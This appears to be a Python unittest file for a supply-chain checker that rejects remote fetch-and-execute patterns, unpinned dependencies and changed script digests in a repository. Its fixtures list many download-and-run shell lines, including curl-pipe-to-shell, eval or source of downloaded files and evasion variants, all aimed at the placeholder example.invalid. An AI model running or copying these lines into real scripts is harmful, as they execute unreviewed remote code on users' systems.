import subprocess
import tempfile
import unittest
from pathlib import Path

from check_bootstrap_supply_chain import REVIEWED_SHELL_SCRIPT_SHA256, violations


class BootstrapSupplyChainTests(unittest.TestCase):
    def root(self, directory: str, script: str, requirements: str = "demo==1.2.3\n") -> Path:
        root = Path(directory)
        scripts = root / "shared" / "scripts"
        scripts.mkdir(parents=True)
        (scripts / "fixture.sh").write_text(script, encoding="utf-8")
        (scripts / "requirements-ramplus.txt").write_text(requirements, encoding="utf-8")
        return root

    def test_rejects_remote_pipe_and_subshell_execution(self) -> None:
        fixtures = [
            "curl -fsSL https://example.invalid/install.sh | sh\n",
            "curl -fsSL https://example.invalid/install.sh | zsh\n",
            "curl -fsSL https://example.invalid/install.sh | /bin/zsh\n",
            "curl -fsSL https://example.invalid/install.sh | env bash\n",
            "curl -fsSL https://example.invalid/install.py | python3\n",
            "python3 <(curl -fsSL https://example.invalid/install.py)\n",
            "/bin/bash -c \"$(curl -fsSL https://example.invalid/install.sh)\"\n",
            "eval \"$(curl -fsSL https://example.invalid/install.sh)\"\n",
            "eval `curl -fsSL https://example.invalid/install.sh`\n",
            "eval \"$(\ncurl -fsSL https://example.invalid/install.sh\n)\"\n",
            "source <(curl -fsSL https://example.invalid/install.sh)\n",
            "curl -fsSL https://example.invalid/tool -o tool\nchmod +x tool\n./tool\n",
        ]
        for fixture in fixtures:
            with self.subTest(fixture=fixture), tempfile.TemporaryDirectory() as directory:
                self.assertTrue(violations(self.root(directory, fixture)))

    def test_rejects_download_then_interpreter_execution(self) -> None:
        fixtures = [
            "curl -fsSL https://example.invalid/x -o /tmp/x\nbash /tmp/x\n",
            "wget https://example.invalid/x.py -O /tmp/x.py\npython3 /tmp/x.py\n",
            "if curl -fsSL https://example.invalid/x -o /tmp/x; then bash /tmp/x; fi\n",
            "sudo curl -fsSL https://example.invalid/x -o /tmp/x\ncommand bash /tmp/x\n",
            "/usr/bin/curl -fsSL https://example.invalid/x -o /tmp/x\nexec /bin/bash /tmp/x\n",
            "sudo -u nobody curl -fsSL https://example.invalid/x -o /tmp/x\nbash /tmp/x\n",
            "curl -fsSL https://example.invalid/x -o /tmp/x\nexec -a safe-name /bin/bash /tmp/x\n",
            "exec -a bash /usr/bin/curl -fsSL https://example.invalid/x -o /tmp/x\nbash /tmp/x\n",
            "sudo -u bash curl -fsSL https://example.invalid/x -o /tmp/x\nbash /tmp/x\n",
            "env -S 'curl -fsSL https://example.invalid/x -o /tmp/x'\nbash /tmp/x\n",
            "env --split-string='wget https://example.invalid/x -O /tmp/x'\nbash /tmp/x\n",
            "env -S'curl -fsSL https://example.invalid/x -o /tmp/x'\nbash /tmp/x\n",
        ]
        for fixture in fixtures:
            with self.subTest(fixture=fixture), tempfile.TemporaryDirectory() as directory:
                root = self.root(directory, fixture)
                self.assertTrue(any("artifact-bound" in failure for failure in violations(root)))

    def test_rejects_download_then_source_eval_or_nested_shell(self) -> None:
        fixtures = [
            "curl -fsSL https://example.invalid/x -o /tmp/x\n. /tmp/x\n",
            "wget https://example.invalid/x -O /tmp/x\nsource /tmp/x\n",
            "curl -fsSL https://example.invalid/x -o /tmp/x\neval \"$(cat /tmp/x)\"\n",
            "curl -fsSL https://example.invalid/x -o /tmp/x\nbash -c 'source /tmp/x'\n",
            "curl -fsSL https://example.invalid/x -o /tmp/x\npython3 -c 'exec(open(\"/tmp/x\").read())'\n",
            "sh -c 'curl -fsSL https://example.invalid/x -o /tmp/x; . /tmp/x'\n",
            "command sh -c 'curl -fsSL https://example.invalid/x -o /tmp/x; . /tmp/x'\n",
            "bash -ec 'curl -fsSL https://example.invalid/x -o /tmp/x; . /tmp/x'\n",
            "curl -fsSL https://example.invalid/x -o /tmp/x\nprintf /tmp/x | xargs bash\n",
            "curl -fsSL https://example.invalid/x -o /tmp/x\nfind /tmp -name x -exec bash {} \\;\n",
        ]
        for fixture in fixtures:
            with self.subTest(fixture=fixture), tempfile.TemporaryDirectory() as directory:
                failures = violations(self.root(directory, fixture))
                self.assertTrue(any("artifact-bound" in failure for failure in failures))

    def test_rejects_constant_indirection_continuations_and_numeric_chmod(self) -> None:
        fixtures = [
            "GET=curl\n$GET -fsSL https://example.invalid/x -o /tmp/x\nbash /tmp/x\n",
            "GET=curl; $GET -fsSL https://example.invalid/x -o /tmp/x\nbash /tmp/x\n",
            "${GET:-curl} -fsSL https://example.invalid/x -o /tmp/x\nbash /tmp/x\n",
            "RUN=bash\ncurl -fsSL https://example.invalid/x -o /tmp/x\n$RUN /tmp/x\n",
            "RUN=source; curl -fsSL https://example.invalid/x -o /tmp/x; $RUN /tmp/x\n",
            "timeout 30 curl -fsSL https://example.invalid/x -o /tmp/x\nbash /tmp/x\n",
            "curl -fsSL https://example.invalid/x -o /tmp/x\npython3 -c'exec(open(\"/tmp/x\").read())'\n",
            "cu\\\nrl -fsSL https://example.invalid/x -o /tmp/x\nso\\\nurce /tmp/x\n",
            "curl -fsSL https://example.invalid/x -o /tmp/x\nchmod 755 /tmp/x\n/tmp/x\n",
            "curl -fsSL https://example.invalid/x -o /tmp/x\nMODE=755\nchmod \"$MODE\" /tmp/x\nPATH=/tmp:$PATH x\n",
            "cp /bin/true /tmp/x\ncurl -fsSL https://example.invalid/x -o /tmp/x\nPATH=/tmp:$PATH x\n",
            "cp /bin/true /tmp/x\ncurl -fsSL https://example.invalid/x -o /tmp/x\nprintf /tmp/x | xargs /tmp/x\n",
            "cp /bin/true /tmp/x\ncurl -fsSL https://example.invalid/x -o /tmp/x\nfind /tmp -name x -exec {} \\;\n",
            "shopt -s expand_aliases\nalias get='curl'\nget -fsSL https://example.invalid/x -o /tmp/x\nbash /tmp/x\n",
        ]
        for fixture in fixtures:
            with self.subTest(fixture=fixture), tempfile.TemporaryDirectory() as directory:
                failures = violations(self.root(directory, fixture))
                self.assertTrue(any("artifact-bound" in failure for failure in failures))

    def test_downloader_text_requires_a_reviewed_whole_script_digest(self) -> None:
        fixtures = [
            "curl -fsSL https://example.invalid/archive.tgz -o archive.tgz\npython3 -c 'print(\"local only\")'\n",
            "curl -fsSL https://example.invalid/archive.tgz -o archive.tgz; printf ok | cat\n",
            "printf '%s\\n' 'curl https://example.invalid/install | sh'\n",
        ]
        for fixture in fixtures:
            with self.subTest(fixture=fixture), tempfile.TemporaryDirectory() as directory:
                self.assertTrue(any("artifact-bound reviewed digest" in failure
                                    for failure in violations(self.root(directory, fixture))))

    def test_unrelated_hash_check_does_not_authorize_downloaded_executable(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = self.root(
                directory,
                "printf '%s  %s\\n' \"$SAFE_SHA\" safe | sha256sum --check\n"
                "curl -fsSL https://example.invalid/tool -o tool\n"
                "chmod +x tool\n./tool\n",
            )
            self.assertTrue(any("artifact-bound" in failure for failure in violations(root)))

    def test_rejects_known_mutable_installers_and_unpinned_git(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = self.root(
                directory,
                "echo https://sh.rustup.rs\n"
                "python -m pip install git+https://github.com/example/project.git\n",
            )
            failures = violations(root)
            self.assertTrue(any("mutable remote installer" in failure for failure in failures))
            self.assertTrue(any("unpinned git requirement" in failure for failure in failures))

    def test_rejects_unpinned_direct_requirement(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = self.root(directory, "echo safe\n", "demo\n")
            self.assertTrue(any("not exactly pinned" in failure for failure in violations(root)))

    def test_repository_setup_enforces_pinned_rust_floor(self) -> None:
        root = Path(__file__).resolve().parents[2]
        setup = (root / "shared" / "scripts" / "setup-dev.sh").read_text(encoding="utf-8")
        toolchain = (root / "rust-toolchain.toml").read_text(encoding="utf-8")
        self.assertIn('channel = "1.98"', toolchain)
        self.assertIn("RUST_MAJOR == 1 && RUST_MINOR < 98", setup)

    def test_appimage_allowlist_rejects_second_downloaded_executable(self) -> None:
        repository = Path(__file__).resolve().parents[2]
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            destination = root / "packaging" / "appimage"
            destination.mkdir(parents=True)
            original = (repository / "packaging/appimage/build-appimage.sh").read_text(encoding="utf-8")
            (destination / "build-appimage.sh").write_text(
                original + "\ncommand curl -o evil https://example.invalid/evil\nbash evil\n",
                encoding="utf-8",
            )
            scripts = root / "shared" / "scripts"
            scripts.mkdir(parents=True)
            (scripts / "requirements-ramplus.txt").write_text("demo==1.0\n", encoding="utf-8")
            self.assertTrue(any("artifact-bound" in failure for failure in violations(root)))

    def test_appimage_allowlist_digest_is_unconditional(self) -> None:
        repository = Path(__file__).resolve().parents[2]
        original = (repository / "packaging/appimage/build-appimage.sh").read_text(encoding="utf-8")
        replacements = [
            "GET=curl\n$GET -o /tmp/x https://example.invalid/x\n. /tmp/x\n",
            "cu\\\nrl -o /tmp/x https://example.invalid/x\nsource /tmp/x\n",
            original + "\n# one-byte contract drift\n",
        ]
        for replacement in replacements:
            with self.subTest(replacement=replacement[:40]), tempfile.TemporaryDirectory() as directory:
                root = Path(directory)
                appimage = root / "packaging/appimage"
                appimage.mkdir(parents=True)
                (appimage / "build-appimage.sh").write_text(replacement, encoding="utf-8")
                scripts = root / "shared/scripts"
                scripts.mkdir(parents=True)
                (scripts / "requirements-ramplus.txt").write_text("demo==1.0\n", encoding="utf-8")
                failures = violations(root)
                self.assertTrue(any("artifact-bound shell script digest changed" in failure
                                    for failure in failures))

    def test_git_discovery_covers_shell_names_and_ignores_build_outputs(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            subprocess.run(["git", "init", "-q", str(root)], check=True)
            scripts = root / "shared/scripts"
            scripts.mkdir(parents=True)
            (scripts / "requirements-ramplus.txt").write_text("demo==1.0\n", encoding="utf-8")
            (root / "safe.sh").write_text("#!/bin/sh\necho safe\n", encoding="utf-8")
            malicious = [root / "bootstrap.bash", root / "bootstrap", root / "bøotstrap.sh"]
            for path in malicious:
                shebang = "#!/usr/bin/env -S -i /bin/bash -eu" if path.name == "bootstrap" else "#!/bin/bash"
                path.write_text(
                    f"{shebang}\ncurl -fsSL https://example.invalid/x -o /tmp/x\nsource /tmp/x\n",
                    encoding="utf-8",
                )
            newline_path = root / "line\nbreak.sh"
            newline_created = True
            try:
                newline_path.write_text(
                    "#!/bin/sh\ncurl -fsSL https://example.invalid/x -o /tmp/x\n. /tmp/x\n",
                    encoding="utf-8",
                )
            except OSError:
                newline_created = False
            (root / ".gitignore").write_text("build/\n", encoding="utf-8")
            ignored = root / "build/generated.sh"
            ignored.parent.mkdir()
            ignored.write_text("curl https://example.invalid/x | sh\n", encoding="utf-8")
            subprocess.run(["git", "-C", str(root), "add", "-A"], check=True)
            failures = violations(root)
            for path in malicious:
                self.assertTrue(any(failure.startswith(f"{path.name}:") for failure in failures))
            if newline_created:
                self.assertTrue(any(failure.startswith("line\nbreak.sh:") for failure in failures))
            self.assertFalse(any("build" in failure and "generated.sh" in failure for failure in failures))

    def test_rejects_package_build_and_attached_env_shell_forms(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            subprocess.run(["git", "init", "-q", str(root)], check=True)
            scripts = root / "shared/scripts"
            scripts.mkdir(parents=True)
            (scripts / "requirements-ramplus.txt").write_text("demo==1.0\n", encoding="utf-8")
            package = root / "packaging/aur/PKGBUILD"
            package.parent.mkdir(parents=True)
            package.write_text("prepare() { curl https://example.invalid/x | bash; }\n", encoding="utf-8")
            attached = root / "attached"
            attached.write_text("#!/usr/bin/env -Sbash -eu\necho unsafe\n", encoding="utf-8")
            split = root / "split"
            split.write_text("#!/usr/bin/env --split-string=bash -eu\necho unsafe\n", encoding="utf-8")
            subprocess.run(["git", "-C", str(root), "add", "-A"], check=True)
            failures = violations(root)
            for relative in ("packaging\\aur\\PKGBUILD", "attached", "split"):
                self.assertTrue(any(failure.replace("/", "\\").startswith(f"{relative}:")
                                    for failure in failures))

    def test_rejects_tracked_symlink_and_overlong_extensionless_shebang(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            subprocess.run(["git", "init", "-q", str(root)], check=True)
            scripts = root / "shared/scripts"
            scripts.mkdir(parents=True)
            (scripts / "requirements-ramplus.txt").write_text("demo==1.0\n", encoding="utf-8")
            long_script = root / "bootstrap"
            long_script.write_text(
                "#!/usr/bin/env -S " + ("-u SAFE " * 600) + "bash -eu\n"
                "curl https://example.invalid/x | bash\n",
                encoding="utf-8",
            )
            blob = subprocess.run(
                ["git", "-C", str(root), "hash-object", "-w", "--stdin"],
                input=b"generated/payload",
                check=True,
                capture_output=True,
            ).stdout.decode("ascii").strip()
            subprocess.run(
                ["git", "-C", str(root), "update-index", "--add", "--cacheinfo", f"120000,{blob},dangling.sh"],
                check=True,
            )
            repository = Path(__file__).resolve().parents[2]
            build = root / "build.sh"
            build.write_text((repository / "build.sh").read_text(encoding="utf-8"), encoding="utf-8")
            subprocess.run(["git", "-C", str(root), "add", "build.sh"], check=True)
            subprocess.run(
                ["git", "-C", str(root), "update-index", "--cacheinfo", f"120000,{blob},build.sh"],
                check=True,
            )
            subprocess.run(["git", "-C", str(root), "add", "bootstrap", "shared/scripts/requirements-ramplus.txt"], check=True)
            failures = violations(root)
            self.assertTrue(any(failure.startswith("dangling.sh:") and "symlinks are forbidden" in failure
                                for failure in failures))
            self.assertTrue(any(failure.startswith("build.sh:") and "symlinks are forbidden" in failure
                                for failure in failures))
            self.assertTrue(any(failure.startswith("bootstrap:") and "reviewed digest" in failure
                                for failure in failures))

    def test_empty_tracked_shell_set_is_valid(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            subprocess.run(["git", "init", "-q", str(root)], check=True)
            scripts = root / "shared/scripts"
            scripts.mkdir(parents=True)
            requirements = scripts / "requirements-ramplus.txt"
            requirements.write_text("demo==1.0\n", encoding="utf-8")
            (root / ".gitignore").write_text("build/\n", encoding="utf-8")
            ignored = root / "build/generated.sh"
            ignored.parent.mkdir()
            ignored.write_text("curl https://example.invalid/x | sh\n", encoding="utf-8")
            subprocess.run(["git", "-C", str(root), "add", ".gitignore", "shared/scripts/requirements-ramplus.txt"], check=True)
            self.assertEqual(violations(root), [])

    def test_reviewed_shell_script_inventory_is_exact(self) -> None:
        self.assertEqual(REVIEWED_SHELL_SCRIPT_SHA256, {
            "platforms/linux/src/app/tests/native_launch_smoke.sh": "6350484466b32dd622e79ca01a4fb1dfa2f3ab0fb8b26cb4031eda00e5415d55",
            "build.sh": "0bccb6ce7c8c0c65e75a95ce112d967f7a31fe1f1e911d208d992f45bda0b203",
            "packaging/appimage/build-appimage.sh": "35ce78d880dbad8fe943805afa4b9bd776fd0c8a4b8a8e2b039177066194369c",
            "packaging/aur/PKGBUILD": "de07136c5526e85e3a07e1208ef4a5346ecb3a2cf526a82dc446244005614cb1",
            "platforms/apple/run.sh": "036976c2da31d285bd0a3f4a7eac0b1432c5f8a9bad28d03f7635e27e3224d90",
            "platforms/apple/scripts/assemble_app.sh": "dbe206e9a6d2785703f8e9ff17340f59599ec96188bbb1fe85f59106579ca6e1",
            "platforms/apple/scripts/build_corpus.sh": "a5f53f4df77c07dc7aefd4e0c31dbbaa90dac92e68d3e614c789c36320cced87",
            "platforms/apple/scripts/build_dmg.sh": "f94530031b064c8619eba0ee19bfaf5435876ed0913fe0b5fedb63022fa73a7d",
            "platforms/apple/scripts/ensure_mlx_metallib.sh": "814daff5af2738d7720d0612f5df25a865d83a3c3e3811c8c0090a5b2e9d2700",
            "platforms/apple/scripts/iterate.sh": "d1a8b267f80e4ef1f1ecaa52c32ad9f4a1d906998edfa323cc2c306a68bfa3dc",
            "platforms/apple/scripts/testflight.sh": "0a6b73aa896f6eb225f5c0f7947631d55d99e35d632b05d32140c018ce5a2b9f",
            "platforms/apple/scripts/release.sh": "c2da74ff7730894b775fa73db773e4105de25fe5a4c61d2e4c27ec41361b8cd5",
            "platforms/apple/scripts/wipe_local_state.sh": "2e5cc7bc43084c64c53bc8e415fd0ccf9beab6207e93126d55fdf6689aada6df",
            "platforms/linux/build/build.sh": "9317ee0397365c42431f38d2f20ea6b9b6690bf63f30655ffd229f23d6e224f9",
            "platforms/linux/build/build-llama-runtime.sh": "fe712236753a9dcc4b8e37d9629e0a0b4856e2899eeae013aca335f87cff76a3",
            "scripts/build-tools.sh": "a51e97da6eea88eda05eb211ee62f80d4274b683bf7aaba921ad06c71f3323ee",
            "shared/scripts/check_tls_pins.sh": "3096b3be8c3e93030cb5c69c1157c76413e51a333c785e70392feaf46c527024",
            "shared/scripts/build_ffmpeg_lgpl_linux.sh": "18b235201c4fa3740f7c31b8bd429558520d6084a57b0a7f94beb880098be7db",
            "shared/scripts/build_ffmpeg_lgpl_windows_x64.sh": "9f1a958f27fcf20ec3ff762ca84528e0b4fcda1f88f81ccb988bf36ea3f10d46",
            "shared/scripts/run_local_audit_gate.sh": "96f0d2d77eddece17aba99229b92d7385d2c06bbead05f275b890e3eec99a2a7",
            "shared/scripts/setup-dev.sh": "51fabe91e0068235e818599df6f3658976c7c074c4f80620643e549f3a59d971",
            "tools/git-hooks/pre-commit": "30ce0c4982fb3b163e84948dd3c84f268761e03ace1428346f21f79b59e9da5b",
        })

    def test_repository_reviewed_download_exec_contract_passes(self) -> None:
        root = Path(__file__).resolve().parents[2]
        self.assertEqual(violations(root), [])

    def test_new_download_only_script_still_requires_explicit_review(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = self.root(
                directory,
                "curl -fsSL https://example.invalid/archive.tar.gz -o archive.tar.gz\n"
                "python -m pip install git+https://github.com/example/project.git@0123456789abcdef0123456789abcdef01234567\n",
                "demo==1.2.3\nother-package==4.5.6\n",
            )
            self.assertTrue(any("artifact-bound reviewed digest" in failure
                                for failure in violations(root)))


if __name__ == "__main__":
    unittest.main()
